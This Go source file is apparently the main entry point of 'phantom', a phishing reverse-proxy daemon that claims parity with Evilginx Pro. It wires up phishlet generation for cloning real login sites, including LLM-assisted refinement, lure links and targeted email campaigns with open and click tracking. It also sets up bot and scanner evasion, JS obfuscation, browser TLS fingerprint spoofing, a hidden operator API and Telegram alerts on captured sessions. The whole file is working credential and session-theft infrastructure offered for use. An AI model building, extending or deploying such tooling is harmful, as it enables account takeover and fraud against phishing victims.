// Command phantom — daemon + CLI (Evilginx Pro паритет: run как демон, validate, deploy, gen).
package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"time"

	"github.com/phantom-v2/phantom/core"
	"github.com/phantom-v2/phantom/core/phishlet"
	"github.com/phantom-v2/phantom/core/proxy"
	"github.com/phantom-v2/phantom/core/session"
	"github.com/phantom-v2/phantom/internal/api"
	"github.com/phantom-v2/phantom/internal/blocklist"
	"github.com/phantom-v2/phantom/internal/botguard"
	"github.com/phantom-v2/phantom/internal/campaign"
	"github.com/phantom-v2/phantom/internal/config"
	"github.com/phantom-v2/phantom/internal/deploy"
	"github.com/phantom-v2/phantom/internal/dns"
	"github.com/phantom-v2/phantom/internal/events"
	"github.com/phantom-v2/phantom/internal/lures"
	"github.com/phantom-v2/phantom/internal/mailer"
	"github.com/phantom-v2/phantom/internal/menu"
	"github.com/phantom-v2/phantom/internal/notify"
	"github.com/phantom-v2/phantom/internal/obfuscate"
	"github.com/phantom-v2/phantom/internal/phishgen"
	"github.com/phantom-v2/phantom/internal/pullsync"
	"github.com/phantom-v2/phantom/internal/puppet"
	"github.com/phantom-v2/phantom/internal/ratelimit"
	"github.com/phantom-v2/phantom/internal/setup"
	"github.com/phantom-v2/phantom/internal/spoof"
	internaltls "github.com/phantom-v2/phantom/internal/tls"
	"github.com/phantom-v2/phantom/internal/upstream"
	redisstore "github.com/phantom-v2/phantom/storage/redis"
	"github.com/phantom-v2/phantom/storage/sqlite"
)

const version = "2.0.0"

func main() {
	cfgPath := flag.String("config", "config.yaml.example", "path to config")
	phishDir := flag.String("phishlets", "configs/phishlets", "phishlets dir")
	apiAddr := flag.String("api", "127.0.0.1:8080", "stealth api listen addr")
	validate := flag.Bool("validate", false, "validate config+phishlets and exit")
	showVer := flag.Bool("version", false, "show version")
	deployIP := flag.String("deploy-ip", "", "generate deploy.sh for server ip")
	deployUser := flag.String("deploy-user", "root", "ssh user")
	deployKey := flag.String("deploy-key", "~/.ssh/id_rsa", "ssh key path")
	watchPhish := flag.Bool("watch-phishlets", false, "poll phishlets dir and hot-reload (15s)")
	gen := flag.Bool("gen", false, "generate phishlet YAML and exit (needs -gen-origin)")
	genOrigin := flag.String("gen-origin", "", "origin host, e.g. login.example.com")
	genDomain := flag.String("gen-domain", "", "phish base domain, e.g. login.phish.test")
	genID := flag.String("gen-id", "", "phishlet id")
	genSub := flag.String("gen-sub", "login", "phish subdomain")
	genHTML := flag.String("gen-html", "", "optional HTML sample file")
	genOut := flag.String("gen-out", "", "output yaml (default stdout)")
	genLLM := flag.String("gen-llm", "", "optional OpenAI-compatible base URL for refine")
	genModel := flag.String("gen-model", "llama3", "LLM model for refine")
	pullURL := flag.String("phishlets-pull", "", "git-sync phishlets DB into -phishlets dir, then continue")
	pullEvery := flag.String("phishlets-pull-every", "", "repeat git-sync interval, e.g. 1h (empty = once/off)")
	menuMode := flag.Bool("menu", false, "interactive operator TUI (needs running server + API)")
	setupMode := flag.Bool("setup", false, "first-run wizard: writes config.yaml")
	flag.Parse()

	if *setupMode {
		a := setup.Ask(os.Stdin, os.Stdout)
		if err := setup.WriteFile(*cfgPath, setup.Render(a), os.Stdin, os.Stdout); err != nil {
			log.Fatalf("setup: %v", err)
		}
		fmt.Println("written " + *cfgPath)
		return
	}
	if *menuMode {
		runMenu(*cfgPath, *apiAddr, *phishDir)
		return
	}

	if *showVer {
		fmt.Println("phantom", version)
		return
	}
	if *gen {
		if err := runGen(*genOrigin, *genDomain, *genID, *genSub, *genHTML, *genOut, *genLLM, *genModel); err != nil {
			log.Fatalf("gen: %v", err)
		}
		return
	}
	cfg, err := config.Load(*cfgPath)
	if err != nil {
		log.Fatalf("config: %v", err)
	}
	pullEveryDur := time.Duration(0)
	if *pullURL != "" {
		changed, err := pullsync.Sync(*phishDir, *pullURL, 90*time.Second)
		if err != nil {
			log.Fatalf("phishlets-pull: %v", err)
		}
		log.Printf("phishlets-pull: changed=%v dir=%s", changed, *phishDir)
		if *pullEvery != "" {
			var err error
			pullEveryDur, err = time.ParseDuration(*pullEvery)
			if err != nil || pullEveryDur < time.Minute {
				log.Fatalf("phishlets-pull-every: bad duration %q (min 1m)", *pullEvery)
			}
		}
	} else if *pullEvery != "" {
		log.Fatalf("phishlets-pull-every needs -phishlets-pull URL")
	}
	st := phishlet.NewStore()
	if err := st.LoadDir(*phishDir); err != nil {
		log.Fatalf("phishlets: %v", err)
	}
	if *deployIP != "" {
		script := deploy.Script(*deployIP, *deployUser, *deployKey, cfg.Domains[0])
		if err := deploy.Write("deploy.sh", script); err != nil {
			log.Fatalf("deploy: %v", err)
		}
		fmt.Println("deploy.sh written")
		return
	}
	if *validate {
		fmt.Printf("ok: domains=%d phishlets=%d log=%s\n", len(cfg.Domains), st.Count(), cfg.LogLevel)
		return
	}

	ctx := context.Background()

	// SQLite персистентность (факты, без vault).
	sqlDB, err := sqliteopen(cfg.Storage.SQLitePath)
	if err != nil {
		log.Fatalf("sqlite: %v", err)
	}
	defer sqlDB.Close()
	sqlite.OnError = func(err error) { log.Printf("node=%s sqlite: %v", cfg.NodeID, err) }
	bus := &events.Persistent{Inner: events.New(), DB: sqlDB, NodeID: cfg.NodeID,
		OnError: func(err error) { log.Printf("node=%s sqlite captures: %v", cfg.NodeID, err) }}

	// Sessions: Failover dual-write Redis+memory.
	mem := session.NewMemory(time.Duration(cfg.Storage.SessionTTLMin) * time.Minute)
	var sess core.SessionStore = mem
	if rs := redisstore.New(cfg.Storage.RedisAddr, time.Duration(cfg.Storage.SessionTTLMin)*time.Minute); rs.Ping(ctx) == nil {
		sess = redisstore.NewFailover(rs, mem)
		log.Printf("node=%s sessions: redis %s + memory mirror", cfg.NodeID, cfg.Storage.RedisAddr)
	} else {
		log.Printf("node=%s sessions: memory (redis %s unreachable)", cfg.NodeID, cfg.Storage.RedisAddr)
	}
	sess = sqlite.SessionWrap{Inner: sess, DB: sqlDB}

	// TLS + DNS: wildcard на каждый домен.
	dnsProv, err := dns.For(cfg.TLS.DNSProvider)
	if err != nil {
		log.Fatalf("dns: %v", err)
	}
	certMgr := internaltls.AutoCert{
		CertFile: cfg.API.CertFile,
		KeyFile:  cfg.API.KeyFile,
		Email:    cfg.TLS.Email,
		DNS:      dnsProv,
		Lab:      cfg.TLS.DNSProvider == "disabled",
		Autocert: cfg.TLS.Autocert != nil && *cfg.TLS.Autocert,
	}
	for _, d := range cfg.Domains {
		if err := certMgr.EnsureWildcard(ctx, d); err != nil {
			log.Printf("cert %s: %v", d, err)
		}
	}

	luresStore := lures.New()
	luresStore.OnUse = func(path string, uses int) {
		if err := sqlDB.IncSmartUse(path); err != nil {
			log.Printf("node=%s sqlite uses: %v", cfg.NodeID, err)
		}
	}
	refreshLures := func() {
		for _, p := range st.All() {
			luresStore.Seed(p.ID, p.LurePath)
			if err := sqlDB.InsertLure(p.ID, p.LurePath); err != nil {
				log.Printf("sqlite lure %s: %v", p.ID, err)
			}
		}
	}
	refreshLures()
	if saved, err := sqlDB.ListLures(); err == nil {
		for path, pid := range saved {
			luresStore.Add(path, pid)
		}
	} else {
		log.Printf("sqlite lures: %v", err)
	}
	if smart, err := sqlDB.ListSmartLures(); err == nil {
		for _, r := range smart {
			var exp time.Time
			if r.ExpiresAt > 0 {
				exp = time.Unix(r.ExpiresAt, 0)
			}
			sm := lures.Smart{
				Path: r.Path, PhishletID: r.PhishletID, ExpiresAt: exp,
				MaxUses: r.MaxUses, BoundIP: r.BoundIP, RequireChallenge: r.RequireChallenge,
				RedirectURL: r.RedirectURL, Uses: r.Uses,
			}
			if sm.MaxUses > 0 && sm.Uses >= sm.MaxUses && r.Uses > 0 {
				continue // сгоревшую не воскрешаем
			}
			_ = luresStore.SmartCreate(sm)
		}
	} else {
		log.Printf("sqlite smart_lures: %v", err)
	}
	blockedMem := blocklist.New()
	if saved, err := sqlDB.ListBlocks(); err == nil {
		for k, r := range saved {
			blockedMem.Block(k, r)
		}
	}
	var blocked core.Blocklist = sqlite.BlockWrap{Inner: blockedMem, DB: sqlDB}
	eng := proxy.New(st, sess, bus)
	eng.SetGuard(botguard.Scorer{}, blocked, spoof.Render)
	eng.SetLures(luresStore)
	eng.SetJS(obfuscate.Obfuscate)
	eng.SetLimiter(ratelimit.New(120, time.Minute))
	eng.SetChallenge(puppet.Reporter{Prefix: cfg.ChallPath, Block: blocked, Bus: bus})
	eng.SetChallengePrefix(cfg.ChallPath)
	eng.SetSidName(cfg.SessCookie)
	eng.SetChallengePage(func() string { return spoof.ChallengeFor(cfg.ChallPath) })
	eng.SetChallengePage(spoof.Challenge)

	// Кампании: per-target приманки + трекинг + рассылка (SMTP только env).
	campStore := campaign.NewStore()
	campStore.DB = sqlDB
	campStore.OnError = func(err error) { log.Printf("node=%s sqlite camp: %v", cfg.NodeID, err) }
	if camps, tgts, err := sqlDB.ListCampaigns(); err != nil {
		log.Printf("node=%s sqlite campaigns: %v", cfg.NodeID, err)
	} else {
		byCamp := map[string][]campaign.Target{}
		for _, t := range tgts {
			var z campaign.Target
			z.ID, z.CampaignID, z.Email, z.LurePath = t.ID, t.CampaignID, t.Email, t.Lure
			if t.Sent {
				z.SentAt = time.Now()
			}
			if t.Opened {
				z.OpenedAt = time.Now()
			}
			if t.Clicked {
				z.ClickedAt = time.Now()
			}
			z.Submitted = t.Submitted
			byCamp[t.CampaignID] = append(byCamp[t.CampaignID], z)
		}
		for _, c := range camps {
			var stop time.Time
			if c.StopAt > 0 {
				stop = time.Unix(c.StopAt, 0)
			}
			campStore.Restore(campaign.Campaign{
				ID: c.ID, Name: c.Name, PhishletID: c.PhishletID,
				TTLMin: c.TTLMin, MaxUses: c.MaxUses, Status: c.Status,
				CreatedAt: time.Unix(c.CreatedAt, 0), StopAt: stop,
			}, byCamp[c.ID])
		}
		log.Printf("node=%s campaigns restored: %d", cfg.NodeID, len(camps))
	}
	smtpPort, _ := strconv.Atoi(os.Getenv("SMTP_PORT"))
	mailCfg := mailer.Config{
		Host: os.Getenv("SMTP_HOST"), Port: smtpPort,
		User: os.Getenv("SMTP_USER"), Pass: os.Getenv("SMTP_PASS"),
		From: os.Getenv("SMTP_FROM"), FromName: os.Getenv("SMTP_FROMNAME"),
		DryRun: os.Getenv("SMTP_LIVE") != "1",
	}
	if d, _ := strconv.Atoi(os.Getenv("SMTP_DELAY_S")); d > 0 {
		mailCfg.Delay = time.Duration(d) * time.Second
	}
	campSvc := &campaign.Service{
		Campaigns: campStore, Lures: luresStore,
		Mail: &mailer.Sender{Cfg: mailCfg},
	}
	eng.SetTracker(campaign.Tracker{Campaigns: campStore})
	campSvc.Watch(ctx, bus.Inner)
	if cfg.TLS.UpstreamTLS == "chrome" {
		eng.SetTransport(upstream.ChromeTransport())
		log.Print("upstream: uTLS chrome + H2")
	}

	// Hot-reload стора без рестарта: API reload/upsert + опциональный watch.
	dir := *phishDir
	persistSmart := func(in api.SmartLureIn) {
		var exp int64
		if in.TTLMin > 0 {
			exp = time.Now().Add(time.Duration(in.TTLMin) * time.Minute).Unix()
		}
		if err := sqlDB.UpsertSmartLure(sqlite.SmartLureRow{
			Path: in.Path, PhishletID: in.PhishletID, ExpiresAt: exp,
			MaxUses: in.MaxUses, BoundIP: in.BoundIP, RequireChallenge: in.RequireChallenge,
			RedirectURL: in.RedirectURL,
		}); err != nil {
			log.Printf("sqlite smart: %v", err)
		}
	}
	apiDeps := func() api.Deps {
		return api.Deps{
			StealthHost: cfg.API.StealthHostname,
			CAFile:      cfg.API.CAFile,
			Store:       st,
			Blocked:     blocked,
			Lures:       luresStore,
			StartedAt:   time.Now(),
			Token:       os.Getenv("PHANTOM_API_TOKEN"),
			Limit:       ratelimit.New(60, time.Minute),
			NodeID:      cfg.NodeID,
			Presets:     sqlDB,
			Campaigns:   campSvc,
			Caps: func(limit int) ([]map[string]any, error) {
				rows, err := sqlDB.ListCaptures(limit)
				if err != nil {
					return nil, err
				}
				out := make([]map[string]any, 0, len(rows))
				for _, r := range rows {
					out = append(out, map[string]any{
						"session": r.SessionID, "kind": r.Kind,
						"node": r.Node, "at": r.CreatedAt,
					})
				}
				return out, nil
			},
			Config: func() map[string]any {
				return map[string]any{
					"domains":         cfg.Domains,
					"shared_443":      cfg.Shared443,
					"upstream_tls":    cfg.TLS.UpstreamTLS,
					"dns_provider":    cfg.TLS.DNSProvider,
					"wildcard":        cfg.TLS.Wildcard,
					"autocert":        cfg.TLS.Autocert != nil && *cfg.TLS.Autocert,
					"telegram":        cfg.Notify.TelegramEnabled,
					"session_ttl_min": cfg.Storage.SessionTTLMin,
					"https_port":      cfg.HTTPSPort,
				}
			},
			PhishDir: dir,
			OnSmart:  persistSmart,
			OnReload: func() error {
				if err := st.Reload(dir); err != nil {
					return err
				}
				refreshLures()
				return nil
			},
			OnUpsert: func(yml []byte) (string, error) {
				p, err := st.UpsertYAML(yml)
				if err != nil {
					return "", err
				}
				if err := st.Save(p.ID); err != nil {
					log.Printf("phishlet persist %s: %v", p.ID, err)
				}
				luresStore.Seed(p.ID, p.LurePath)
				return p.ID, nil
			},
			OnGenerate: func(origin, domain, id, sub, html string) (string, error) {
				return phishgen.GenerateYAML(phishgen.Input{
					ID: id, Origin: origin, Domain: domain, PhishSub: sub, HTML: html,
				})
			},
		}
	}
	if *watchPhish {
		go watchDir(ctx, dir, st, refreshLures)
		log.Printf("watch: hot-reload %s every 15s", dir)
	}
	if pullEveryDur > 0 {
		pullURLv, phishDirv := *pullURL, dir
		go pullsync.StartLoop(ctx, phishDirv, pullURLv, pullEveryDur, func() {
			if err := st.Reload(phishDirv); err != nil {
				log.Printf("pullsync reload: %v", err)
				return
			}
			refreshLures()
			log.Printf("pullsync: reloaded %s", phishDirv)
		})
		log.Printf("phishlets-pull: every %s", pullEveryDur)
	}

	// Telegram-нотификации: токен только env, чат yaml/env.
	if cfg.Notify.TelegramEnabled {
		tgToken := os.Getenv("TELEGRAM_BOT_TOKEN")
		if tgToken == "" || cfg.Notify.ChatID == "" {
			log.Print("telegram: skipped (need TELEGRAM_BOT_TOKEN + chat_id)")
		} else {
			tg := &notify.Bot{
				Token: tgToken, ChatID: cfg.Notify.ChatID,
				Block: func(k, r string) { blocked.Block(k, r) },
				Drop: func(ctx context.Context, sid string) error {
					if d, ok := sess.(core.SessionDropper); ok {
						return d.Drop(ctx, sid)
					}
					return fmt.Errorf("drop unsupported")
				},
			}
			tgCtx, tgCancel := context.WithCancel(context.Background())
			defer tgCancel()
			tg.Watch(tgCtx, bus.Inner)
			go tg.Poll(tgCtx)
			log.Print("telegram: watching captures")
		}
	}

	go func() {
		h := api.Handler(apiDeps())
		// Решение по топологии: split по дефолту (lab), shared-443 опционально (prod).
		if cfg.Shared443 {
			return // API едет на общем 443 ниже
		}
		log.Printf("stealth api on %s (host=%s)", *apiAddr, cfg.API.StealthHostname)
		mtls, _ := api.MTLSConfig(cfg.API.CAFile)
		srv := &http.Server{Addr: *apiAddr, Handler: h, TLSConfig: mtls}
		var err error
		if mtls != nil {
			err = srv.ListenAndServeTLS(cfg.API.CertFile, cfg.API.KeyFile)
		} else {
			err = srv.ListenAndServe()
		}
		if err != nil {
			log.Printf("api: %v", err)
		}
	}()

	addr := fmt.Sprintf("%s:%d", cfg.Bind, cfg.HTTPSPort)
	if addr == "0.0.0.0:443" && os.Getenv("PHANTOM_ALLOW_443") == "" && !cfg.Shared443 {
		addr = "127.0.0.1:8443" // dev-safe по умолчанию
	}
	log.Printf("node=%s phantom %s listening on %s shared443=%v (domains=%d phishlets=%d)", cfg.NodeID, version, addr, cfg.Shared443, len(cfg.Domains), st.Count())

	useTLS := hasCertPair(cfg.API.CertFile, cfg.API.KeyFile)
	if cfg.Shared443 {
		apiH := api.Handler(apiDeps())
		root := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if r.Host == cfg.API.StealthHostname || r.Header.Get("X-Stealth-Host") == cfg.API.StealthHostname {
				apiH.ServeHTTP(w, r)
				return
			}
			eng.ServeHTTP(w, r)
		})
		if useTLS {
			mtls, _ := api.MTLSConfig(cfg.API.CAFile)
			srv := &http.Server{Addr: addr, Handler: root, TLSConfig: mtls}
			log.Fatal(srv.ListenAndServeTLS(cfg.API.CertFile, cfg.API.KeyFile))
		}
		log.Fatal(http.ListenAndServe(addr, root))
	}
	if useTLS {
		log.Fatal(http.ListenAndServeTLS(addr, cfg.API.CertFile, cfg.API.KeyFile, eng))
	}
	log.Fatal(http.ListenAndServe(addr, eng))
}

// runMenu — операторское TUI поверх stealth API (сервер уже запущен).
func runMenu(cfgPath, apiAddr, phishDir string) {
	cfg, err := config.Load(cfgPath)
	if err != nil {
		log.Fatalf("menu config: %v", err)
	}
	base := "http://" + apiAddr
	exe, _ := os.Executable()
	c := &menu.Client{
		Base:    base,
		Stealth: cfg.API.StealthHostname,
		Token:   os.Getenv("PHANTOM_API_TOKEN"),
	}
	fmt.Printf("Phantom menu -> %s (stealth %s)\n", base, cfg.API.StealthHostname)
	loc := menu.Local{Exe: exe, Config: cfgPath, PhishDir: phishDir, API: base}
	if err := menu.Run(c, loc); err != nil {
		log.Fatalf("menu: %v", err)
	}
}

// runGen — CLI-генератор фишлетов (эвристика + опциональный LLM-refine).
func runGen(origin, domain, id, sub, htmlPath, out, llmBase, model string) error {
	if origin == "" || domain == "" || id == "" {
		return fmt.Errorf("need -gen-origin, -gen-domain, -gen-id")
	}
	var html string
	if htmlPath != "" {
		b, err := os.ReadFile(htmlPath)
		if err != nil {
			return err
		}
		html = string(b)
	}
	yml, err := phishgen.GenerateYAML(phishgen.Input{
		ID: id, Origin: origin, Domain: domain, PhishSub: sub, HTML: html,
	})
	if err != nil {
		return err
	}
	if llmBase != "" {
		refined, err := phishgen.RefineViaLLM(yml, phishgen.LLMConfig{
			BaseURL: llmBase, Model: model, APIKey: os.Getenv("LLM_API_KEY"),
		})
		if err != nil {
			log.Printf("gen: llm refine failed (%v), using heuristic", err)
		} else {
			yml = refined
		}
	}
	if out == "" {
		fmt.Println(yml)
		return nil
	}
	return os.WriteFile(out, []byte(yml), 0o600)
}

// watchDir — опрос директории фишлетов, hot-reload при изменении.
func watchDir(ctx context.Context, dir string, st *phishlet.Store, after func()) {
	last := dirSig(dir)
	t := time.NewTicker(15 * time.Second)
	defer t.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-t.C:
			if sig := dirSig(dir); sig != last {
				last = sig
				if err := st.Reload(dir); err != nil {
					log.Printf("watch reload: %v", err)
					continue
				}
				after()
				log.Printf("watch: reloaded %s", dir)
			}
		}
	}
}

func dirSig(dir string) string {
	matches, _ := filepath.Glob(filepath.Join(dir, "*.yaml"))
	var sb []byte
	for _, f := range matches {
		if fi, err := os.Stat(f); err == nil {
			sb = append(sb, []byte(f+fi.ModTime().String())...)
		}
	}
	return string(sb)
}

func hasCertPair(cert, key string) bool {
	if _, err := os.Stat(cert); err != nil {
		return false
	}
	_, err := os.Stat(key)
	return err == nil
}

func sqliteopen(path string) (*sqlite.DB, error) {
	if dir := dirOf(path); dir != "" && dir != "." {
		_ = os.MkdirAll(dir, 0o750)
	}
	return sqlite.Open(path)
}

func dirOf(p string) string {
	if i := lastSlash(p); i >= 0 {
		return p[:i]
	}
	return ""
}

func lastSlash(p string) int {
	for i := len(p) - 1; i >= 0; i-- {
		if p[i] == '/' || p[i] == '\\' {
			return i
		}
	}
	return -1
}
